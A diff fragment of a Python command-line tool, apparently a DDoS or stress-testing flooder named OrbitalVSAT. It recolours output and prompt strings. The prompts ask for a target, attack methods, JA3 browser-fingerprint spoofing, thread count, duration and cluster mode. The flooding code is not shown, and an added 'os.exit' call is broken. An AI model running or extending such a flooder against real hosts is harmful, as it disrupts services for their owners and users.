-            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TOTAL REQUESTS: {Fore.MAGENTA} {finalCount:,} {Fore.RESET}"
+            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TOTAL REQUESTS: {Color.white} {finalCount:,} {Color.reset}"
         )
         animx(
-            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TOTAL SENT: {Fore.MAGENTA} {finalBytes / 1048576:.2f} {Fore.BLUE} Mb {Fore.RESET}"
+            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TOTAL SENT: {Color.white} {finalBytes / 1048576:.2f} {Color.cyan} Mb {Color.reset}"
         )
         if self.duration > 0:
             animx(
-                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} AVG RPS: {Fore.MAGENTA} {finalCount / self.duration:.0f} {Fore.RESET}"
+                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} AVG RPS: {Color.white} {finalCount / self.duration:.0f} {Color.reset}"
             )
             animx(
-                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} AVG Bandwidth: {Fore.MAGENTA} {(finalBytes * 8) / (self.duration * 1048576):.2f} {Fore.BLUE} Mbps {Fore.RESET}"
+                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} AVG Bandwidth: {Color.white} {(finalBytes * 8) / (self.duration * 1048576):.2f} {Color.cyan} Mbps {Color.reset}"
             )
 
 
 def main():
     clear()
-    animx(banner)
+    banner()
     try:
         choice = (
             input(
-                f"{Fore.MAGENTA}[{Fore.YELLOW} INFO {Fore.MAGENTA}] {Fore.GREEN}Continue? {Fore.GREEN}Y{Fore.WHITE}/{Fore.RED}n{Fore.WHITE}/{Fore.CYAN}h {Fore.YELLOW}"
+                f"{Color.white}[{Color.orange} INFO {Color.white}] {Color.white}Continue? {Color.darkgreen}Y{Color.white}/{Color.red}n{Color.white}/{Color.cyan}h {Color.orange}"
             )
             .strip()
             .lower()
         )
         if choice == "h":
-            animx(helper)
+            helper()
             input(
-                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} PRESS ENTER TO CONTINUE .... {Fore.RESET}"
+                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} PRESS ENTER TO CONTINUE .... {Color.reset}"
             )
         elif choice == "n":
             sys.exit(0)
-        animx(f"{Fore.RED} ORBITAL CONFIGURATION{Fore.RESET}")
+        animx(f"{Color.red} ORBITAL CONFIGURATION{Color.reset}")
         tester = OrbitalVSAT()
         tester.target = input(
-            f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} TARGET {Fore.WHITE} > {Fore.CYAN}"
+            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} TARGET {Color.white} > {Color.cyan}"
         ).strip()
         if not tester.target:
             return
         tester.method = (
             input(
-                f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} METHODS {Fore.WHITE} > {Fore.CYAN}"
+                f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} METHODS {Color.white} > {Color.cyan}"
             )
             .strip()
             .upper()
@@ -1089,7 +980,7 @@ def main():
         ]:
             proto = (
                 input(
-                    f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} PROTOCOL {Fore.WHITE} [ h1 | h2 | default h1 ] > {Fore.CYAN}"
+                    f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} PROTOCOL {Color.white} [ h1 | h2 | default h1 ] > {Color.cyan}"
                 )
                 .strip()
                 .lower()
@@ -1097,7 +988,7 @@ def main():
             tester.protocol = proto if proto in ["h1", "h2", "h3"] else "h1"
             ja3 = (
                 input(
-                    f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} JA3 PROFILE {Fore.WHITE} [ chrome | firefox | safari ] > {Fore.CYAN}"
+                    f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} JA3 PROFILE {Color.white} [ chrome | firefox | safari ] > {Color.cyan}"
                 )
                 .strip()
                 .lower()
@@ -1106,16 +997,16 @@ def main():
                 ja3 if ja3 in ["chrome", "firefox", "safari"] else "chrome"
             )
         threads = input(
-            f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} THREADS {Fore.WHITE} [ default 500 ] > {Fore.CYAN}"
+            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} THREADS {Color.white} [ default 500 ] > {Color.cyan}"
         ).strip()
         tester.threads = int(threads) if threads else 500
         duration = input(
-            f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} DURATION {Fore.WHITE} [ seconds, default 60 ] > {Fore.CYAN}"
+            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} DURATION {Color.white} [ seconds, default 60 ] > {Color.cyan}"
         ).strip()
         tester.duration = int(duration) if duration else 60
         cluster = (
             input(
-                f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} CLUSTER MODE {Fore.WHITE} [ Y/n ] > {Fore.CYAN}"
+                f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} CLUSTER MODE {Color.white} [ Y/n ] > {Color.cyan}"
             )
             .strip()
             .lower()
@@ -1124,14 +1015,17 @@ def main():
         tester.start()
     except KeyboardInterrupt:
         animx(
-            f"{Fore.RED}[{Fore.YELLOW} INFO {Fore.RED}] {Fore.YELLOW} KEYBOARD INTERRUPTED."
+            f"{Color.red}[{Color.orange} INFO {Color.red}] {Color.orange} KEYBOARD INTERRUPTED."
         )
         sys.exit(0)
     except Exception as e:
         animx(
-            f"{Fore.YELLOW}[{Fore.RED} ERROR {Fore.YELLOW}]: {Fore.RED} {e} {Fore.RESET}"
+            f"{Color.orange}[{Color.red} ERROR {Color.orange}]: {Color.red} {e} {Color.reset}"
         )
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        os.exit(0)
